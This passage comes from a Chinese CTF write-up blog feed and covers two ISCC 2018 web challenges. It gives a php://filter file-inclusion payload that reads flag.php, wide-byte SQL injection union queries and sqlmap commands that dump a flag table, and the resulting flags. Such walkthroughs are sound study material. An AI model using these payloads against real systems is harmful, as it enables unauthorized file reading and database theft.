title="11.试试看"></a>11.试试看</h3><p>打开后只有一个图片，查看源码有个链接，点进去还是那个图片，好像没什么软用，但是看到这个URL后恍然大悟，文件包含没什么好说的，利用伪协议查看文件源码，但是resource改了之后结果就没有了，无论怎么改都不行，迷茫之时大佬点醒了我，resource是可以用两个的，第一个resource不懂，第二个resource可以改成我们需要的，payload如下：<br>    view-source:<a href="http://118.190.152.202:8006/show.php?img=php://filter/read=convert.base64-encode/resource=1.jpg/resource=show.php" target="_blank" rel="noopener">http://118.190.152.202:8006/show.php?img=php://filter/read=convert.base64-encode/resource=1.jpg/resource=show.php</a></p><p>这是show.php的源码：<br><img src="/2018/05/25/ISCC2018-wp/29.png" alt></p><p>不过好像并没有什么软用，同样的方法也可以查看index.php 但是好像也没什么用</p><p>这里大胆猜测一下是否有一个flag.php的文件，发现并没有，那就试一试上一个目录下有没有该文件，直接查看../flag.php就可以，终于找到了flag.php文件，附上payload:<br>    <a href="http://118.190.152.202:8006/show.php?img=php://filter/read=convert.base64-encode/resource=1.jpg/resource=../flag.php" target="_blank" rel="noopener">http://118.190.152.202:8006/show.php?img=php://filter/read=convert.base64-encode/resource=1.jpg/resource=../flag.php</a></p><pre><code>flag{1ntere5ting_PHP_Regu1ar_express1onssssss}</code></pre><h3 id="12-SQL注入的艺术"><a href="#12-SQL注入的艺术" class="headerlink" title="12.SQL注入的艺术"></a>12.SQL注入的艺术</h3><p>既然是SQL注入，那就各种注入都试试，<br>注入点在id上，最后试出来是宽字节注入，继续测试查询的字段，发现总共可以查询8个字段，这里给出最原始的注入语句：</p><pre><code>http://118.190.152.202:8015/index.php?id=-1%df&apos; select 1,2,3,4,5,6,7,8%23</code></pre><p>接下来就是最简单的联合查询注入了，就不再多说，直接给出诸如语句：</p><pre><code>爆表名：http://118.190.152.202:8015/index.php?id=-1%df&apos; union select 1,(select table_name from information_schema.tables where table_schema=database()),3,version(),5,6,7,8 %23爆字段名：http://118.190.152.202:8015/index.php?id=-1%df&apos; union select 1,group_concat(column_name),3,4,5,6,7,8 from information_schema.columns where table_schema=database()%23爆flag：http://118.190.152.202:8015/index.php?id=-1%df&apos; union select 1,group_concat(flag),3,4,5,6,7,8 from baji.admins %23</code></pre><p>当然这个题还有其他方法，用过sqlmap的童鞋应该都知道sqlmap是个注入工具，给它payload之后可以自己注入出结果，下面直接给出注入语句：</p><pre><code>爆数据库名：python2 sqlmap.py -u &quot;http://118.190.152.202:8015/index.php?id=1%df&apos;&quot; --dbs</code></pre><p><img src="/2018/05/25/ISCC2018-wp/30.png" alt></p><pre><code>爆表名：python2 sqlmap.py -u &quot;http://118.190.152.202:8015/index.php?id=1%df&apos;&quot; -D baji --table</code></pre><p><img src="/2018/05/25/ISCC2018-wp/31.png" alt></p><pre><code>爆字段名：python2 sqlmap.py -u &quot;http://118.190.152.202:8015/index.php?id=1%df&apos;&quot; -D baji -T admins --column</code></pre><p><img src="/2018/05/25/ISCC2018-wp/32.png" alt></p><pre><code>爆flag：python2 sqlmap.py -u &quot;http://118.190.152.202:8015/index.php?id=1%df&apos;&quot; -D baji -T admins -C flag --dump</code></pre><p><img src="/2018/05/25/ISCC2018-wp/33.png" alt></p><p>flag奉上：</p><pre><code>Y0u_@@33w_dxxmn_9rf0Od</code></pre><h3 id="后续待更"><a href="#后续待更" class="headerlink" title="后续待更"></a>后续待更</h3>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;MISC&quot;&gt;&lt;a href=&quot;#MISC&quot; class=&quot;headerlink&quot; title=&quot;MISC&quot;&gt;&lt;/a&gt;MISC&lt;/h2&gt;&lt;h4 id=&quot;1-有趣的ISCC&quot;&gt;&lt;a href=&quot;#1-有趣的ISCC&quot; class=&quot;headerlink&quot; title=&quot;1.有趣的ISCC&quot;&gt;&lt;/a&gt;1.有趣的ISCC&lt;/h4&gt;&lt;p&gt;&lt;img src=&quot;/2018/05/25/ISCC2018-wp/1.png&quot; alt&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="writeup" scheme="http://black0saturday.github.io/tags/writeup/"/>
    
  </entry>
  
</feed>
